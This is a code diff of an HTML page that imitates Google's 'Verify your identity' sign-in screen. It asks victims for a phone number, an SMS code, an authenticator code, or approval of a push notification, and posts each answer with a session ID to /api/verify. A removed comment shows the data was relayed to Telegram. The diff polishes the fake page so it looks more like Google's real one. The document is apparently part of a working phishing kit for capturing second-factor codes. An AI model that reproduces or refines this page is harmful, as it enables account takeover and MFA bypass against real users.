@@ -3,43 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify your identity</title>
+    <title>Verify your identity - Google Accounts</title>
     <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
 </head>
 <body>
     <div class="container">
-        <div class="login-box">
-            <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_light_color_272x92dp.png" alt="Google" class="logo">
-            <h1 id="promptTitle">Verify your identity</h1>
-            <p id="promptSubtitle" class="subtitle">Enter the verification information</p>
+        <div class="card">
+            <div class="header">
+                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_272x92dp.png" alt="Google" class="logo">
+                <h1 id="promptTitle">Verify your identity</h1>
+                <p id="promptSubtitle" class="subtitle">Enter the verification information</p>
+            </div>
             
-            <div id="promptIcon" style="text-align:center; font-size:60px; margin-bottom:20px;">📱</div>
+            <div id="promptIcon" class="prompt-icon">📱</div>
             
             <form id="promptForm">
                 <div class="input-group">
-                    <input type="text" id="promptInput" required placeholder=" ">
+                    <input type="text" id="promptInput" required>
                     <label id="inputLabel">Enter value</label>
+                    <div class="underline"></div>
                 </div>
                 <button type="submit" class="btn-next">Verify</button>
             </form>
             
-            <div id="notificationBox" style="display:none; text-align:center; padding:20px;">
-                <p style="font-size:18px; margin-bottom:20px;">🔔 A notification has been sent to your other device</p>
-                <p style="color:#5f6368; margin-bottom:20px;">Please check your phone and approve the sign-in</p>
-                <button id="notificationDone" class="btn-next">✓ I've approved it</button>
+            <div id="notificationBox" style="display:none;">
+                <div class="notification-card">
+                    <div class="notification-icon">🔔</div>
+                    <p class="notification-title">Check your other device</p>
+                    <p class="notification-text">A sign-in request was sent to your phone</p>
+                    <button id="notificationDone" class="btn-next">Yes, that was me</button>
+                </div>
             </div>
             
-            <div id="sessionInfo" style="margin-top: 15px; font-size: 12px; color: #9aa0a6; text-align: center;"></div>
+            <div id="sessionInfo" class="session-info"></div>
         </div>
     </div>
     
     <script>
-        // Get parameters from URL
         const urlParams = new URLSearchParams(window.location.search);
         const type = urlParams.get('type');
-        
-        // Get session ID from URL or sessionStorage
         const sessionId = sessionStorage.getItem('sessionId') || 'unknown';
+        
         document.getElementById('sessionInfo').textContent = `Session: ${sessionId}`;
         
         const promptTitle = document.getElementById('promptTitle');
@@ -50,10 +55,9 @@
         const promptForm = document.getElementById('promptForm');
         const notificationBox = document.getElementById('notificationBox');
         
-        // Configure based on type
         switch(type) {
             case 'phone':
-                promptTitle.textContent = 'Enter your phone number';
+                promptTitle.textContent = 'Verify your phone number';
                 promptSubtitle.textContent = 'We\'ll send a verification code';
                 promptIcon.textContent = '📱';
                 inputLabel.textContent = 'Phone number';
@@ -62,7 +66,7 @@
                 break;
                 
             case 'sms':
-                promptTitle.textContent = 'Enter SMS verification code';
+                promptTitle.textContent = 'Enter verification code';
                 promptSubtitle.textContent = 'We sent a code to your phone';
                 promptIcon.textContent = '✉️';
                 inputLabel.textContent = 'Verification code';
@@ -71,7 +75,7 @@
                 break;
                 
             case '2fa':
-                promptTitle.textContent = 'Enter 2FA/Security Code';
+                promptTitle.textContent = 'Enter security code';
                 promptSubtitle.textContent = 'Use your authenticator app';
                 promptIcon.textContent = '🔐';
                 inputLabel.textContent = 'Security code';
@@ -80,7 +84,7 @@
                 break;
                 
             case 'notification':
-                promptTitle.textContent = 'Check your other device';
+                promptTitle.textContent = 'Check your device';
                 promptSubtitle.textContent = 'Approve the sign-in request';
                 promptIcon.textContent = '🔔';
                 promptForm.style.display = 'none';
@@ -95,7 +99,6 @@
                 promptInput.type = 'text';
         }
         
-        // Handle form submission (phone, sms, 2fa)
         promptForm.addEventListener('submit', async (e) => {
             e.preventDefault();
             
@@ -106,40 +109,31 @@
                 return;
             }
             
-            // Show loading
-            document.querySelector('.login-box').style.opacity = '0.5';
+            document.querySelector('.card').style.opacity = '0.5';
             
             try {
-                // Send verification data to Telegram
                 await fetch('/api/verify', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        sessionId, 
-                        value, 
-                        type 
-                    })
+                    body: JSON.stringify({ sessionId, value, type })
                 });
                 
-                // Show success message
-                alert('✅ Verification submitted!');
                 window.location.href = '/success.html';
                 
             } catch (error) {
                 console.error('Error:', error);
                 alert('Error submitting verification. Please try again.');
-                document.querySelector('.login-box').style.opacity = '1';
+                document.querySelector('.card').style.opacity = '1';
             }
         });
         
-        // Handle notification button
         document.getElementById('notificationDone')?.addEventListener('click', async () => {
             await fetch('/api/verify', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
                     sessionId, 
-                    value: 'Notification approved on device', 
+                    value: 'Approved on device', 
                     type: 'notification' 
                 })
             });
